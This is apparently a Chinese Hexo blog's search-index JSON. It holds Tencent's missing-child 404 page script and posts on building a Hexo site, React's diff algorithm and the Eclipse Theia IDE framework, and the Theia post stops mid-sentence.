{"pages":[{"title":"404","text":"var QZONE = window.QZONE || {}; function imagezoom(imgobj, box_w, box_h) { var src_w = imgobj.width; var src_h = imgobj.height; var r1 = src_w / src_h, r2 = box_w / box_h; var dst_w, dst_h; if (r1 > r2) { dst_w = box_w; dst_h = Math.round(dst_w / src_w * src_h); } else { if (r1 < r2) { dst_h = box_h; dst_w = Math.round(dst_h / src_h * src_w); } else { dst_w = box_w; dst_h = box_h; } } imgobj.style.marginLeft = (box_w - dst_w) / 2 + \"px\"; imgobj.style.marginTop = (box_h - dst_h) / 2 + \"px\"; imgobj.style.width = dst_w + \"px\"; imgobj.style.height = dst_h + \"px\"; imgobj.style.opacity = 1; } (function(_w, _d) { var ha = _d.head || _d.getElementsByTagName(\"head\")[0]; var $scope = {}; var current; var tmnow; var chId; var homePageUrl, homePageName; var scs = document.getElementsByTagName(\"script\"); if (location.href.indexOf(\"fm.qq.com\") > -1 || location.href.indexOf(\"fm.qzone.qq.com\") > -1) { homePageName = \"\\u8fd4\\u56de\\u4f01\\u9e45FM\"; homePageUrl = \"http://fm.qq.com\"; } else { if (location.href.indexOf(\"qzone.qq.com\") > -1) { homePageName = \"\\u8fd4\\u56de\\u6211\\u7684\\u7a7a\\u95f4\"; homePageUrl = \"http://qzone.qq.com\"; } else { homePageName = \"\\u8fd4\\u56de\\u817e\\u8baf\\u7f51\"; homePageUrl = \"http://www.qq.com\"; } } for (var i = 0;i < scs.length;i++) { if (scs[i].src.indexOf(\"404/search_children.js\") > -1) { if (scs[i].getAttribute(\"homePageUrl\")) { homePageUrl = scs[i].getAttribute(\"homePageUrl\"); } if (scs[i].getAttribute(\"homePageName\")) { homePageName = scs[i].getAttribute(\"homePageName\"); } break; } } $scope.rettext = homePageName; $scope.retlink = homePageUrl; function getData(srcUrl, callback) { var sc = _d.createElement(\"script\"); function orc() { if (sc.readyState === \"loaded\") { setTimeout(function() { callback && callback(); }, 0); } } if (sc.addEventListener) { if (callback) { sc.addEventListener(\"load\", callback, false); } } else { sc.attachEvent(\"onreadystatechange\", orc); } ha && ha.appendChild(sc); sc.src = srcUrl; } function resolveData(d) { var tid, len, ddata = [], tdata; if (\"object\" == typeof d && (d.data && (len = d.data.length))) { for (var i = 0;i < len;i++) { var expire = d.data[i].expire; d.data[i]._id = new Date * Math.random() * Math.random() * 1E7; if (expire && tmnow * 1E3 < Date.parse(expire.replace(/\\s[\\s\\S]*$/, \"\").replace(/\\-/g, \"/\"))) { var _c = d.data[i].city, _p = d.data[i].province; if (_c && city) { if ((\"_\" + _c + \"_\").indexOf(\"_\" + city + \"_\") > -1) { ddata.push(d.data[i]); continue; } } if (_p && province) { if ((\"_\" + _p + \"_\").indexOf(\"_\" + province + \"_\") > -1) { ddata.push(d.data[i]); } } } } tid = Math.floor(Math.random() * (ddata.length || len)); tdata = (ddata.length ? ddata : d.data)[chId = tid]; if (_w.foundjsondata) { tdata.ta = tdata.sex.indexOf(\"\\u5973\") > -1 ? \"\\u5979\" : \"\\u4ed6\"; tdata.name = \"\\u201c7\\u00b718\\u7279\\u5927\\u62d0\\u5356\\u5a74\\u513f\\u6848\\u201d\\u544a\\u7834\\uff0c\\u88ab\\u89e3\\u6551\\u768415\\u540d\\u5b69\\u5b50\\u4e2d\\uff0c2\\u4eba\\u7531\\u4eb2\\u751f\\u7236\\u6bcd\\u9886\\u56de\\uff0c\\u4ecd\\u670913\\u540d\\u5b69\\u5b50\\u672a\\u627e\\u5230\\u4eb2\\u751f\\u7236\\u6bcd\\uff0c\\u88ab\\u5b89\\u7f6e\\u5728\\u60e0\\u5dde\\u5e02\\u793e\\u4f1a\\u798f\\u5229\\u9662\\uff0c\" + tdata.ta + \"\\u662f\\u5176\\u4e2d\\u4e4b\\u4e00\\u3002\"; tdata.url = tdata.url.replace(/#p=(\\d{1,2})/, function(a, n) { return \"#p=\" + (+n + 1); }); return format(tmpl2, tdata); } if (!tdata.ext1) { tdata.ext1 = \"\\u4f46\\u6211\\u4eec\\u53ef\\u4ee5\\u4e00\\u8d77\\u5bfb\\u627e\\u5931\\u8e2a\\u5b9d\\u8d1d\"; } return tdata; } } function setTopData(tdata) { current = tdata; $scope.topname = tdata.name; $scope.topgender = tdata.sex; $scope.topbirth = tdata.birth_time; $scope.toplostdate = tdata.lost_time; $scope.toplostplace = tdata.lost_place; $scope.toplostdesc = tdata.child_feature; $scope.toplink = tdata.url; $scope.topimg = tdata.child_pic; $scope.topid = tdata._id; document.body.innerHTML = template(\"body\", $scope); } function init(data) { tmnow = data.tm_now * 1E3; var tdata = resolveData(jsondata); $scope.whichin = 0; jsondata.data.splice(chId, 1); $scope.otherdata = [tdata].concat(jsondata.data.slice(0, 5)); setTopData(tdata); } var timeout; window._Callback = function(d) { clearTimeout(timeout); init(d); }; timeout = setTimeout(function() { _Callback({tm_now:(new Date).getTime() / 1E3}); }, 2E3); _w.share = function(target) { var summary = [\"\\u80cc\\u666f\\uff1a\", current.name, \"\\uff0c\\u6027\\u522b\\uff1a\", current.sex, \"\\uff0c\\u51fa\\u751f\\u65f6\\u95f4\\uff1a\", current.birth_time, \"\\uff0c\\u5931\\u8e2a\\u65f6\\u95f4\\uff1a\", current.lost_time, \"\\uff0c\\u7279\\u5f81\\u63cf\\u8ff0\\uff1a\", current.child_feature].join(\"\"); if (summary) { summary = \"#\\u5bfb\\u627e\\u5931\\u8e2a\\u7684\\u5b9d\\u8d1d#\" + summary; } var stitle = \"\\u5931\\u8e2a\\u7684\\u5b9d\\u8d1d\\u8be6\\u60c5\"; var desc = \"\\u5931\\u8e2a\\u7684\\u5b9d\\u8d1d\\u8981\\u56de\\u5bb6\\uff0c\\u5feb\\u6765\\u53c2\\u4e0e\\u7231\\u5fc3\\u7684\\u4f20\\u9012\\u5427\\uff01\"; var encode = encodeURIComponent; var opts = {\"surl\":\"http://qzone.qq.com/gy/404/\" + current.id + \"/lostchild.html\", \"site\":\"QQ\\u7a7a\\u95f4\", \"summary\":summary || \"#\\u5b9d\\u8d1d\\u56de\\u5bb6#\\u817e\\u8baf\\u5fd7\\u613f\\u8005\\u7528\\u6280\\u672f\\u70b9\\u4eae\\u516c\\u76ca\\uff0c\\u8ba9\\u6211\\u4eec\\u4e00\\u8d77\\u5bfb\\u627e\\u8d70\\u5931\\u7684\\u513f\\u7ae5\\u5427\\uff01\", \"stitle\":stitle, \"pics\":current.child_pic, \"desc\":desc, \"origin_url\":current.url}; var surl = opts.surl || \"http://www.qq.com/404/\", summary = opts.summary || \"\\u8fd9\\u4e2a\\u662f\\u5206\\u4eab\\u7684\\u5185\\u5bb9\", stitle = opts.stitle || \"\\u8fd9\\u4e2a\\u662f\\u5206\\u4eab\\u7684\\u6807\\u9898\", pics = opts.pics || \"http://qzonestyle.gtimg.cn/qzone_v6/act/img/20120422_qzone_7_years/pop_up/icon-pop-seven-years.png\", site = opts.site || \"\\u8fd9\\u4e2a\\u662f\\u5206\\u4eab\\u94fe\\u63a5\\u7684\\u6587\\u5b57\", desc = opts.desc || \"\\u5931\\u8e2a\\u7684\\u5b9d\\u8d1d\\u8981\\u56de\\u5bb6\\uff0c\\u5feb\\u6765\\u53c2\\u4e0e\\u7231\\u5fc3\\u7684\\u4f20\\u9012\\u5427\\uff01\", origin_url = opts.origin_url || \"http://www.qq.com/404/\"; var shareList = {weibo:{method:function(evt) { var w = \"http://v.t.qq.com/share/share.php\", q = [\"?site=\", encode(surl + \"#via=share_t_weib\"), \"&title=\", encode(summary), \"&pic=\", encode(pics), \"&url=\", encode(surl)].join(\"\"), p = [w, q].join(\"\"); openit(p, \"weibo\", \"width=700, height=680, top=0, left=0, toolbar=no, menubar=no, scrollbars=no, location=yes, resizable=no, status=no\"); }}, qzone:{method:function(evt) { var buff = [], ps = {url:surl + \"#via=404-qzoneshare\", desc:desc || \"\\u5931\\u8e2a\\u7684\\u5b9d\\u8d1d\\u8981\\u56de\\u5bb6\\uff0c\\u5feb\\u6765\\u53c2\\u4e0e\\u7231\\u5fc3\\u7684\\u4f20\\u9012\\u5427\\uff01\", summary:summary, title:stitle, pics:pics, site:site}; for (var k in ps) { buff.push(k + \"=\" + encode(ps[k] || \"\")); } var w = \"http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?\" + buff.join(\"&\"), q = [\"#via=share_t_qzone\", \"&title=\", encode(summary), \"&pic=\", encode(pics), \"&url=\", encode(surl)].join(\"\"), p = [w, q].join(\"\"); openit(p, \"qzone\", \"width=700, height=680, top=0, left=0, toolbar=no, menubar=no, scrollbars=no, location=yes, resizable=no, status=no\"); }}, sina:{method:function() { var w = \"http://v.t.sina.com.cn/share/share.php\", q = [\"?url=\", encode(surl + \"#via=share_x_weib\"), \"&title=\", encode(summary), \"&source=\", \"&sourceUrl=\", surl, \"&content=utf-8\", \"&pic=\", encode(pics)].join(\"\"), p = [w, q].join(\"\"); openit(p, \"sina\", \"toolbar=0,status=0,resizable=1,width=440,height=430\"); }}, kaixin:{method:function() { var n = \"http://www.kaixin001.com/repaste/bshare.php?rurl=\" + encode(surl + \"#via=share_kaixin\") + \"&rcontent=&rtitle=\" + encode(summary); openit(n, \"kaixin\", \"toolbar=0,status=0,resizable=1,width=600,height=360\"); }}, renren:{method:function() { var n = \"http://www.connect.renren.com/share/sharer?title=\" + encode(summary) + \"&url=\" + encode(surl + \"#via=share_renren\"), p = window.open(n, \"rr\", \"toolbar=0,status=0,resizable=1,width=510,height=300\"); if (p) { p.focus(); } }}, weixin:{method:function() { var n = \"http://qzone.qq.com/gy/404/page/qrcode.html?url=\" + encode(origin_url + \"#via=share_weixin\"), p = window.open(n, \"rr\", \"toolbar=0,status=0,resizable=1,width=620,height=430\"); if (p) { p.focus(); } }}}; var openit = function(u, n, p) { function o() { var z; if (!(z = window.open(u, n, p))) { location.href = u; } else { z.focus(); } } o(); }; shareList[target] && shareList[target].method(); }; _w.toThis = function(id) { for (var i = 0;i < $scope.otherdata.length;i++) { if ($scope.otherdata[i]._id == id) { setTopData($scope.otherdata[i]); break; } } return false; }; var meta = document.createElement(\"meta\"); meta.name = \"viewport\"; meta.content = \"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"; ha.appendChild(meta); (function registerStyle() { var link = document.createElement(\"link\"); link.rel = \"stylesheet\"; link.type = \"text/css\"; link.href = \"https://qzone.qq.com/gy/404/style/404style.css\"; ha.appendChild(link); })(); (function initStat() { var qqDomainNameRE = /\\.qq\\.com$/i, qzoneDomainNameRE = /\\bqzone\\.qq\\.com$/i, qzsDomainNameRE = /\\bqzonestyle\\.gtimg\\.cn$/i; function cb() { var url = location.host; var src = \"\"; if (qzoneDomainNameRE.test(url)) { src = \"new404.qzone\"; } else { if (qqDomainNameRE.test(url)) { src = \"new404.qq\"; } else { if (qzsDomainNameRE.test(url)) { src = \"new404.qzonestyle\"; } else { src = url.replace(\".\", \"_\"); } } } _w.TCISD && (_w.TCISD.pv && _w.TCISD.pv(\"hat.qzone.qq.com\", \"/gy/lostchild/\" + src)); } getData(\"https://qzonestyle.gtimg.cn/ac/qzfl/stat.js\", cb); })(); })(window, document); !function() { function a(a, b) { return(/string|function/.test(typeof b) ? h : g)(a, b); } function b(a, c) { return \"string\" != typeof a && (c = typeof a, \"number\" === c ? a += \"\" : a = \"function\" === c ? b(a.call(a)) : \"\"), a; } function c(a) { return l[a]; } function d(a) { return b(a).replace(/&(?![\\w#]+;)|[\"']/g, c); } function e(a, b) { if (m(a)) { for (var c = 0, d = a.length;d > c;c++) { b.call(a, a[c], c, a); } } else { for (c in a) { b.call(a, a[c], c); } } } function f(a, b) { var c = /(\\/)[^/]+\\1\\.\\.\\1/, d = (\"./\" + a).replace(/[^/]+$/, \"\"), e = d + b; for (e = e.replace(/\\/\\.\\//g, \"/\");e.match(c);) { e = e.replace(c, \"/\"); } return e; } function g(b, c) { var d = a.get(b) || i({filename:b, name:\"Render Error\", message:\"Template not found\"}); return c ? d(c) : d; } function h(a, b) { if (\"string\" == typeof b) { var c = b; b = function() { return new k(c); }; } var d = j[a] = function(c) { try { return new b(c, a) + \"\"; } catch (d) { return i(d)(); } }; return d.prototype = b.prototype = n, d.toString = function() { return b + \"\"; }, d; } function i(a) { var b = \"{Template Error}\", c = a.stack || \"\"; if (c) { c = c.split(\"\\n\").slice(0, 2).join(\"\\n\"); } else { for (var d in a) { c += \"\\n\" + a[d] + \"\\n\\n\"; } } return function() { return \"object\" == typeof console && console.error(b + \"\\n\\n\" + c), b; }; } var j = a.cache = {}, k = this.String, l = {\"\":\">\", '\"':\"\"\", \"'\":\"'\", \"&\":\"&\"}, m = Array.isArray || function(a) { return \"[object Array]\" === {}.toString.call(a); }, n = a.utils = {$helpers:{}, $include:function(a, b, c) { return a = f(c, a), g(a, b); }, $string:b, $escape:d, $each:e}, o = a.helpers = n.$helpers; a.get = function(a) { return j[a.replace(/^\\.\\//, \"\")]; }, a.helper = function(a, b) { o[a] = b; }, \"function\" == typeof define ? define(function() { return a; }) : \"undefined\" != typeof exports ? module.exports = a : this.template = a, a(\"body\", function(a) { var b = this, c = (b.$helpers, b.$escape), d = a.retlink, e = a.rettext, f = a.topid, g = a.topimg, h = a.topname, i = a.topgender, j = a.topbirth, l = a.toplostdate, m = a.toplostplace, n = a.toplostdesc, o = a.toplink, p = b.$each, q = a.otherdata, r = (a.otheritem, a.index, \"\"); return r += ' 404\\uff0c\\u60a8\\u8bbf\\u95ee\\u7684\\u9875\\u9762\\u627e\\u4e0d\\u56de\\u6765\\u4e86\\uff0c\\u4f46\\u6211\\u4eec\\u53ef\\u4ee5\\u4e00\\u8d77\\u5e2e\\u4ed6\\u4eec\\u56de\\u5bb6\\uff01 ', r += c(e), r += ' ', r += c(h), r += '(', r += c(i), r += ') \\u51fa\\u751f\\u65e5\\u671f\\uff1a', r += c(j), r += ' \\u5931\\u8e2a\\u65f6\\u95f4\\uff1a', r += c(l), r += ' \\u5931\\u8e2a\\u5730\\u70b9\\uff1a', r += c(m), r += ' \\u5931\\u8e2a\\u4eba\\u7279\\u5f81\\u63cf\\u8ff0\\uff1a', r += c(n), r += ' \\u67e5\\u770b\\u8be6\\u60c5 \\u5206\\u4eab \\u817e\\u8baf\\u5fae\\u535a QQ\\u7a7a\\u95f4 \\u65b0\\u6d6a\\u5fae\\u535a \\u5fae\\u4fe1 ', p(q, function(a) { r += ' '; }), r += \" \", new k(r); }); }();","link":"/404.html"}],"posts":[{"title":"Hexo 建站小记","text":"本站使用 Hexo 框架生成，本文用于记录。 Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 前置熟悉的两个程序，如果电脑上没有必须先安装好。 Node.js Git Hexo 安装全局安装 Hexo 及脚手架 1npm install -g hexo-cli 建站安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。 123$ hexo init &lt;folder&gt;$ cd &lt;folder&gt;$ npm install 新建完成后，指定文件夹的目录如下： 12345678├── _config.yml├── package.json├── scaffolds 模版文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件├── source 静态资源文件夹| ├── _drafts| └── _posts└── themes 主题 文件夹_config.yml 网站的配置信息，您可以在此配置大部分的参数 发布文章你可以执行下列命令来创建一篇新文章或者新的页面。一般人用不到新增页面这个功能，市场上已经有很多成熟的主题可以使用。 1$ hexo new [layout] &lt;title&gt; scaffolds文件夹可以自定义新的模版，每次发布或者创建草稿会从这个文件夹里读取对应模版。 实际操作中每次手动输入命令也是很麻烦，这里用到一个 hexo管理工具 hexo-admin, 提供了一个在线的markdown编辑器，支持在线预览，管理文章以及标签分类等。 123npm install --save hexo-adminhexo server -dopen http://localhost:4000/admin/ 主题本博客主题选用了icarus，选择这个主题有两个原因，样式简约又不失大方，第二是组件采用了jsx模版语法相对熟悉，方便魔改。 使用也很简单，在_config.yml配置文件里将主题修改成对应的名字，然后把主题整个目录放到theme文件夹下。 1theme: icarus 部署更新: 使用 git Action 在push代码后自动执行”npm run deploy”本博客使用的是hexo-deployer-git部署到私仓，其他部署方式可以参考官网下载完依赖后在配置文件里添加 12345deploy: type: git repo: https://github.com/&lt;username&gt;/&lt;project&gt; # example, https://github.com/hexojs/hexojs.github.io branch: gh-pages 可以同时推送至多个仓库。 12345deploy: type: git github: https://github.com/&lt;username&gt;/&lt;project&gt; gitee: https://gitee.com/&lt;username&gt;/&lt;project&gt; branch: gh-pages 可以将在Github配置里用域名绑定GitHubPage, 推送之后会自动更新GithubPage, Gitee只有收费版才能自动更新, 所以只能拿来当个备用站。 优化主题优化 样式优化 使用 MetingJS 添加了背景音乐(都是雨声好助眠)，并利用pjax使得路由跳转不会中断音乐播放 新增夜间模式 添加Gittalk评论模块 添加了点小彩蛋~ instant.page.js 能在鼠标hover一个链接300 ms后预加载对应的静态资源 图片添加懒加载和加载效果，资源保存在阿里云存储, 对于访问量不大的个人站还是挺便宜的 打包优化 主题和博客代码仓库通过git submodule分离, 每次博客仓库更新的时候可用命令git submodule update --remote更新所有子模块1git submodule add XXXX // 添加子模块后会看到.gitmodules文件, 该配置文件保存了项目 URL 与已经拉取的本地目录之间的映射 使用gulp在部署前对静态资源进行压缩处理 其他 添加了百度, 谷歌收录 添加了RSS订阅功能","link":"/posts/c84bd824.html"},{"title":"React Diff 算法","text":"众所周知，React fiber 架构 分为调度器(Scheduler), 协调器(Reconclier)，渲染器(Renderer)三个部分。 React Diff 算法Diff 算法，即差异比较算法，是 React 实现原理的核心之一，位于 Reconciler 部分。 一个DOM节点在某一时刻最多会有4个节点与它相关。 current Fiber。如果该DOM节点已在页面中，current Fiber代表该DOM节点对应的Fiber节点。 workInProgress Fiber。如果该DOM节点将在本次更新中渲染到页面中，workInProgress Fiber代表该DOM节点对应的Fiber节点。 DOM节点本身。 JSX对象。即 ClassComponent 的 render 方法的返回结果，或 FunctionComponent 的调用结果。JSX对象中包含描述 DOM 节点的信息。 Diff算法的本质是对比 current Fiber 和 JSX对象，生成 workInProgress Fiber。React 通过此算法比较每次更新之后子虚拟 DOM 树种最小的差异点，并进行计算。 Diff的瓶颈及应对官方文档提到即使使用最优的算法，该算法的复杂程度仍为 O(n 3)，其中 n 是树中元素的数量。 如果在 React 中使用该算法，那么展示 1000 个元素则需要 10 亿次的比较。这个开销实在是太过高昂。于是 React 在以下两个假设的基础之上提出了一套 O(n) 的启发式算法： 1. 只对同一层的节点作比较，不跨层级比较React Diff 算法根据 Web 应用的特点 （Web 应用很少有 component 移动到树的另一个层级，它们大部分只是在相邻的子节点之间移动, 可以忽略不计） 作出以下两个假设，最终达到了接近 O( n )的复杂度。 2. 不同类型的元素会产生出不同的树；不同类型的根节点元素会有不同的形态。 当根节点为不同类型的元素时，React 会拆卸原有的树并且建立起新的树。举个例子，当一个元素从 &lt;a&gt; 变成 &lt;img&gt;，从 &lt;Article&gt; 变成 &lt;Comment&gt;，或从 &lt;Button&gt; 变成 &lt;div&gt; 都会触发一个完整的重建流程。 当卸载一棵树时，对应的 DOM 节点也会被销毁。组件实例将执行 componentWillUnmount() 方法。当建立一棵新的树时，对应的 DOM 节点会被创建以及插入到 DOM 中。组件实例将执行 UNSAFE_componentWillMount() 方法，紧接着 componentDidMount() 方法。所有与之前的树相关联的 state 也会被销毁。 在根节点以下的组件也会被卸载，它们的状态会被销毁。比如，当比对以下更变时： 1234567&lt;div&gt; &lt;Counter /&gt;&lt;/div&gt;&lt;span&gt; &lt;Counter /&gt;&lt;/span&gt; React 会销毁 Counter 组件并且重新装载一个新的组件。 当对比两个相同类型的 React 元素时，React 会保留 DOM 节点，仅比对及更新有改变的属性。 3. key 属性开发者可以通过设置 key 属性，来告知渲染哪些子元素在不同的渲染下可以保存不变；React 使用该键将原始树中的子项与后续树中的子项进行匹配。 在实践中，我们发现以上假设在几乎所有实用的场景下都成立。 Diff 算法实现reconcileChildFibers 源码在此 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 根据newChild类型选择不同diff函数处理function reconcileChildFibers( returnFiber: Fiber, currentFirstChild: Fiber | null, newChild: any,): Fiber | null { // 对 UnkeyedTopLevelFragment 进行处理 const isUnkeyedTopLevelFragment = typeof newChild === 'object' &amp;&amp; newChild !== null &amp;&amp; newChild.type === REACT_FRAGMENT_TYPE &amp;&amp; newChild.key === null; if (isUnkeyedTopLevelFragment) { newChild = newChild.props.children; } const isObject = typeof newChild === 'object' &amp;&amp; newChild !== null; if (isObject) { // object类型，可能是 REACT_ELEMENT_TYPE 或 REACT_PORTAL_TYPE switch (newChild.$$typeof) { case REACT_ELEMENT_TYPE: // 调用 reconcileSingleElement 处理 // // ...省略其他case } } if (typeof newChild === 'string' || typeof newChild === 'number') { // 调用 reconcileSingleTextNode 处理 // ...省略 } if (isArray(newChild)) { // 调用 reconcileChildrenArray 处理 // ...省略 } // 一些其他情况调用处理函数 // ...省略 // 以上都没有命中，删除节点 return deleteRemainingChildren(returnFiber, currentFirstChild);} 我们可以从同级的节点数量将Diff分为两类： 当newChild类型为 object 、number 、string，代表同级只有一个节点 当newChild类型为 Array ，同级有多个节点 优化建议 该算法不会尝试匹配不同组件类型的子树。如果你发现你在两种不同类型的组件中切换，但输出非常相似的内容，建议把它们改成同一类型。在实践中，我们没有遇到这类问题。 Key 应该具有稳定，可预测，以及列表内唯一的特质（无需全局唯一）。不稳定的 key（比如通过 Math.random() 生成的）会导致许多组件实例和 DOM 节点被不必要地重新创建，这可能导致性能下降和子组件中的状态丢失。 参考资料 https://zh-hans.reactjs.org/docs/reconciliation.html#the-diffing-algorithm https://react.iamkasong.com/diff/prepare.html","link":"/posts/c6d9fc5a.html"},{"title":"Theia 扫盲篇","text":"Theia 扫盲篇What is Eclipse Theia?Eclipse Theia 是一个基于现代 Web 技术(TypeScript, CSS 和 HTML)实现，用于构建桌面/云 IDE 或者定制工具的开源平台。 Clode IDE 是解决本地开发环境存在的一些问题的一种方案。例如开发机性能要求高、开发环境配置复杂、依赖特定设备、复杂工程管理难等问题。 目前市面上已经有一些基于 Theia 构建的 Clode IDE 产品: 如 Gitpod … 打开 Gitpod 后就可以看到它的界面和常用的 VS Code 是很相似的。二者之间的比较在下方。 Theia 作为一个开发 IDE 和工具的平台，有三个目标： 提供公共特性，可以重用这些公共特性尽可能高效地实现自定义工具，这些可重用特性大大降低了实现自定义工具或 IDE 所需的工作; 提供基本的工作台框架，包括菜单、状态栏、视图概念、部件布局、工作空间抽象等，工作台可以通过自定义 UI 扩展进行扩展，比如菜单项、自定义视图和自定义编辑器； 复用常用工具特性，如集成支持 LSP 的源代码编辑器、支持 Git、终端等工具 提供将现有和新模块集成到定制产品的机制，允许您通过组合现有模块和自定义扩展来创建自定义产品；在 Theia 里, 可以说是万物皆拓展，包括其核心模块也是以拓展包的形式存在; 一套代码可以同时使用桌面应用程序和 Web 应用程序(独特卖点); Theia和VSCode对于前端开发者来说, VS Code可谓再熟悉不过了。 VS Code是一种现成的产品，用户可以自行下载和扩展，目前已经是最流行的开发者工具之一。Eclipse Theia 则是一个允许创建完全自定义和带有白标产品的一个框架，是用于构建ide的平台而不是ide本身。 对比指标 VS Code Product VS Code Project Eclipse Theia 可用性概念 ✔✔ ✔✔ ✔✔ 技术栈和架构 ✔✔ ✔✔ ✔✔ 可扩展性和适应性 ？ ✔ ✔✔ 可用的扩展和技术 ✔✔ ✔ ? 在线/离线功能，桌面端/云端 ✔(Visual Studio Online) ✖ ✔✔ 开源 ✖ ✔✔ ✔✔ 生态系统和供应商中立性 ? ✔ ✔✔ 详细对比可以直接点这。 可用性概念：VS Code 主要关注代码，在用户界面中占用的功能非常少，它的可用性概念是围绕使用键盘，而不是鼠标。许多特性只能通过CLI或命令面板获得。Theia 和 VS Code 使用相同的代码编辑器(Monaco)、窗口管理和非常相似的命令面板，以及大多数默认的快捷方式都是相同的。 技术栈和架构：VS Code 和 Eclipse Theia 都基于 Web 技术，包括 TypeScript，HTML5，CSS 以及 Node.js。实际上 Theia 复用了 VS Code 大量的技术，例如结合 Monaco code editor 和 language server protocol (LSP) 的方式，通过 LSP 允许以标准化的方式将代码编辑器的 UI 特性与底层逻辑解耦。 可扩展性和适应性：VS Code 通过用户可安装的 VS Code Extensions 提供了一种扩展机制，提供一套内置的 API 用于扩展 VS Code。Eclipse Theia 提供了一个类似的扩展机制，但称之为 Theia Plugins。Theia 实现了相同的API，所以许多 VS Code 扩展也可以在 Theia中 使用(API并未完全兼容)。简而言之，VS Code Extensions 和 Theia Plugins 在概念上几乎是一样的。通过内置的 API，可以很容易开发一个VS Code 拓展，拓展运行在特定的进程中可以很好的保证产品稳定性，以及允许在运行时安装。这种扩展模式促进了 VS Code 生态，但是缺点是只能基于公开的 API 进行拓展。虽然涵盖了许多用例，例如添加命令，视图或扩展代码编辑，由于无法预见，因此很难进行其他一些修改。Theia 官方说插件克服了 VS Code 拓展的一些限制，提供了更强大的扩展机制。 可用的扩展和技术：Eclipse Theia 支持 VS Code 扩展 API，也可以在 Theia 中使用VS代码扩展，不过有两个限制条件： Theia 还没有覆盖 VS Code 定义的全部 API，存在部分不可用的情况 VS Code 插件市场的使用条款限制插件 在线与离线功能/多端：最开始 VS Code 和 Theia 的区别就是在线和离线的区别，Theia 的核心架构明确允许将产品部署为桌面应用程序，并通过浏览器在云中访问。目前 VS Code 和 Theia 都支持在线和离线功能。11月4日，微软公开了 Visual Studio Online 的预览(基于VS Code的基于云的IDE)。 开源：VS Code Project 是开源的，但是 VS Code Product 不是开源的，VS Code Project 基于 MIT 协议；Theia 是基于 Eclipse Public License (EPL) 协议。最大的限制是只允许 VS Code 产品连接 VS Code 拓展市场，其他产品不能直接使用 VS Code 拓展市场的服务。 生态系统和三方库独立性：Theia 复用了 VS Code 生态的大量代码，所以整体代码数量上相对少一些。整体上讲 VS Code 生态更强大，Theia 的优势在于由 Eclipse 基金会托管，众多 Eclipse 成员公司参与 Eclipse Theia 的贡献。 VS Code 实际上也没那么开源。加上近年来微软收购了 github, 相当与掌握了绝大部分开源社区, 又制造了逐渐取代js的新标准 Typescript，还拥有最流行的开发者工具生态势头正旺。Theia就是在这种背景下应运而生-意在打破微软的在IDE寡头统治, 但本身又复用了 VS Code 大量的技术, 颇有种”要用魔法来打败魔法”的味道。 Theia 架构 概述Theia 被设计为一个可以在本地运行的桌面应用程序，也可以在浏览器和远程服务器之间工作。 支持的架构方式 前端 后端 Web Client, Remote Back-end (Cloud IDE) 本地 Browser 远端 Node Native Front-End, Local Back-end(桌面应用) Electron Electron Native Front-End, Remote Back-end Electron 远端 Node 为了支持这两种工作方式，Theia 运行在两个互相独立的进程-前端和后端，相互之间通过 WebSockets 上的 JSON-RPC(一个无状态且轻量级的远程过程调用传送协议，其传递内容透过JSON 为主) 消息或 HTTP 上的 REST APIs 来通信。对于 Electron 而言，前端和后端都在本地运行，而在远程上下文中，后端运行在远程服务器上。前端和后端进行都有它们各自的依赖注入 (DI) 容器以方便开发者进行扩展。 按平台进行区分在扩展包的根目录下，包含如下子目录层级，按不同的平台进行区分： common：目录下包含的代码不依赖于任何运行时； browser：目录下包含的代码需要运行在现代浏览器平台上(DOM API)； electron-browser：目录下包含了需要 DOM API 及 Electron 渲染进程特定的 APIs 的前端代码； node：目录包含了需要运行在 Node.js 下的后端代码； node-electron：目录包含了 Electron 特定的后端代码。 layoutTheia 的布局和 VS Code 很相像, 都是使用了 PhosphorJS来构建模板样式 (Jupyter等开源项目的界面样式也是用了相同框架) ApplicationShell 类继承自 @phosphor/widgets 的 Widget 类，负责管理应用的顶层 Widget，可以添加、移除、激活 Widget。widget 类也有自己的生命周期。Application shell Widget 由 @phosphor/widgets 的组件组成，主要分为以下几部分： topPanel：类似 VS Code 的标题栏(Title Bar)视图 mainPanel：类似于 VS Code 编辑器(Editor)视图 leftPanel：类似 VS Code 的 活动栏(Activity Bar)视图+ Side Bar(侧边栏)视图 rightPanel：和 leftPanel 同一类型，VS Code 没有这部分的视图 bottomPanel：类似于 VS Code 的面板(Panal)视图 statusBar：类似于 VS Code 的 状态栏(Status Bar)视图 拓展性ServicesService 是一个提供给其它组件使用的绑定。一个扩展包可以公开 SelectionService，这样其它扩展包就可以获得一个注入的实例并使用它。 Contribution-PointsContribution-Points 是沿用了 VS Code 的架构, 贡献能力分为六大类：通用能力、主题、声明性语言功能、程序语言功能、工作区拓展、调试。(详细查看) 如果一个扩展包想要提供 hook 由其它扩展包来实现其中的功能，那么它应该定义一个 contribution-point。一个 contribution-point 就是一个可以被其它扩展包实现的接口。扩展包可以在需要时将它委托给其它部分。例如，OpenerService 定义了一个 contribution-point，允许其它扩展包注册 OpenHandler，你可以查看 这里 的代码。Theia 已经提供了大量的 Contribution Points 列表，查看已存在的 Contribution Points 的一个好方法是查找 bindContributionProvider 的引用。 configuration 用户设置/工作区设置的配置 configurationDefaults 默认编辑器配置 commands 命令 menus 菜单选项 keybindings 快捷键 languages 编程语言支持 debuggers 调试器 breakpoints 断点 grammars 语法高亮 themes 主题 iconThemes 文件图标主题 productIconThemes 产品图标主题 snippets 代码片段 jsonValidation JSON 配置文件校验 views 自定义视图 viewsContainers 自定义视图容器 problemMatchers 问题匹配器模式 problemPatterns 命名问题模式 taskDefinitions 定义任务 colors 定义颜色名称 typescriptServerPlugins TypeScript 服务器插件 其他 首选项，命令面板，菜单，快捷键绑定，文件系统，导航栏，查找，终端，长期运行任务支持, Git支持, 国际化, 打包流程 详细架构设计内容可以查看这。 Theia 拓展机制ExtensionTheia 由扩展包构成，前端应用程序和主后端应用程序均包含多个扩展。 一个 npm 软件包可以公开一个或多个扩展，这些扩展可以被前端和主后端应用程序使用。一个扩展包就是一个 npm 包，在这个 npm 包中公开了用于创建 DI 容器的多个 DI 模块 (ContainerModule) 。通过在应用程序的 